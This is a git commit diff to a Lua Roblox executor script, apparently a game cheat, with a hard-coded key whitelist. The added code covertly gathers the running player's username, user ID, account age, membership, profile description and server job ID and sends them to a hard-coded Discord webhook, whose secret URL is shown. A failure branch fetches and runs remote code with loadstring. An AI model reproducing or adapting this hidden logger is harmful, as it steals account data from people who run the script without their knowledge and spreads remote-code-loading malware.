91ac861c63f85ae691c8eb64a8a92d1c1e87fba5
385j8888 <2586125757@qq.com>
2025-08-20 01:01:19 +0800

    Add files via upload

--- 脑叶脚本2.lua
+++ 脑叶脚本2.lua
@@ -83,6 +83,8 @@ elseif a=="sAyujkk1s"then
 _G.white=true
 elseif a=="qawsedrf11451421"then
 _G.white=true
+elseif a=="GBwcnm"then
+_G.white=true
 end
 if _G.white==true then
     print("验证成功")
@@ -105,6 +107,121 @@ else --验证失败执行↓
        loadstring(game:HttpGet("https://raw.githubusercontent.com/385j8888/ZOUMAGUIX/refs/heads/main/%E6%A0%B8%E5%AF%BC%E5%BC%B9%E9%95%BF%E8%BE%BE5000%E5%A4%9A%E6%95%B0%E6%8D%AE%E8%83%BD%E8%AE%A9%E4%BD%A0%E6%94%BE%E4%B8%80%E4%B8%AA%E6%A0%B8%E5%BC%B9.txt"))()
    end
 end
+
+
+
+
+
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService('HttpService')
+
+getgenv().Notify = true
+local Notify_Webhook = "https://discord.com/api/webhooks/1407373188282847274/S0nE58NJ9elM6zUtmBWalFstqGs33mZL0rfuDSC1f2n66QGiyKvErKk0AaH-_D3ZIffa"
+function notify_hook()
+	-- Thumb API
+	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
+	local json = HttpService:JSONDecode(ThumbnailAPI)
+	local avatardata = json.data[1].imageUrl
+
+	-------- User API Script
+	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
+	local json = HttpService:JSONDecode(UserAPI)
+	-------- Description Data
+	local DescriptionData = json.description
+	-------- Created Data
+	local CreatedData = json.created
+
+	local send_data = {
+		["username"] = "Jumpscare Notify",
+		["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
+		["content"] = "Jeff Wuz Here !",
+		["embeds"] = {
+			{
+				["title"] = "Jeff's Log",
+				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
+				["color"] = 4915083,
+				["fields"] = {
+					{
+						["name"] = "Username",
+						["value"] = player.Name,
+						["inline"] = true
+					},
+					{
+						["name"] = "Display Name",
+						["value"] = player.DisplayName,
+						["inline"] = true
+					},
+					{
+						["name"] = "User ID",
+						["value"] = player.UserId,
+						["inline"] = true
+					},
+					{
+						["name"] = "Account Age",
+						["value"] = player.AccountAge.." Day",
+						["inline"] = true
+					},
+					{
+						["name"] = "Membership",
+						["value"] = player.MembershipType.Name,
+						["inline"] = true
+					},
+					{
+						["name"] = "Account Created Day",
+						["value"] = string.match(CreatedData, "^([%d-]+)"),
+						["inline"] = true
+					},
+					{
+						["name"] = "Profile Description",
+						["value"] = "```\n"..DescriptionData.."\n```",
+						["inline"] = true
+					}
+				},
+				["footer"] = {
+					["text"] = "JTK Log",
+					["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
+				},
+				["thumbnail"] = {
+					["url"] = avatardata
+				}
+			}
+		},
+	}
+
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+
+	request({
+		Url = Notify_Webhook,
+		Method = "POST",
+		Headers = headers,
+		Body = game:GetService("HttpService"):JSONEncode(send_data)
+	})
+end
+
+if getgenv().Notify == true then
+	if Notify_Webhook == '' then
+		return;
+	else
+		notify_hook()
+	end
+elseif getgenv().Notify == false then
+	return;
+else
+	warn("True or False")
+end
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -599,101 +716,3 @@ Duration = 10})
 
 
 
-
-
-getgenv().Notify = true
-local Notify_Webhook = "https://discord.com/api/webhooks/1407373188282847274/S0nE58NJ9elM6zUtmBWalFstqGs33mZL0rfuDSC1f2n66QGiyKvErKk0AaH-_D3ZIffa"
-function notify_hook()
-	-- Thumb API
-	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
-	local json = HttpService:JSONDecode(ThumbnailAPI)
-	local avatardata = json.data[1].imageUrl
-
-	-------- User API Script
-	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
-	local json = HttpService:JSONDecode(UserAPI)
-	-------- Description Data
-	local DescriptionData = json.description
-	-------- Created Data
-	local CreatedData = json.created
-
-	local send_data = {
-		["username"] = "Jumpscare Notify",
-		["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
-		["content"] = "Jeff Wuz Here !",
-		["embeds"] = {
-			{
-				["title"] = "Jeff's Log",
-				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
-				["color"] = 4915083,
-				["fields"] = {
-					{
-						["name"] = "Username",
-						["value"] = player.Name,
-						["inline"] = true
-					},
-					{
-						["name"] = "Display Name",
-						["value"] = player.DisplayName,
-						["inline"] = true
-					},
-					{
-						["name"] = "User ID",
-						["value"] = player.UserId,
-						["inline"] = true
-					},
-					{
-						["name"] = "Account Age",
-						["value"] = player.AccountAge.." Day",
-						["inline"] = true
-					},
-					{
-						["name"] = "Membership",
-						["value"] = player.MembershipType.Name,
-						["inline"] = true
-					},
-					{
-						["name"] = "Account Created Day",
-						["value"] = string.match(CreatedData, "^([%d-]+)"),
-						["inline"] = true
-					},
-					{
-						["name"] = "Profile Description",
-						["value"] = "```\n"..DescriptionData.."\n```",
-						["inline"] = true
-					}
-				},
-				["footer"] = {
-					["text"] = "JTK Log",
-					["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
-				},
-				["thumbnail"] = {
-					["url"] = avatardata
-				}
-			}
-		},
-	}
-
-	local headers = {
-		["Content-Type"] = "application/json"
-	}
-
-	request({
-		Url = Notify_Webhook,
-		Method = "POST",
-		Headers = headers,
-		Body = game:GetService("HttpService"):JSONEncode(send_data)
-	})
-end
-
-if getgenv().Notify == true then
-	if Notify_Webhook == '' then
-		return;
-	else
-		notify_hook()
-	end
-elseif getgenv().Notify == false then
-	return;
-else
-	warn("True or False")
-end
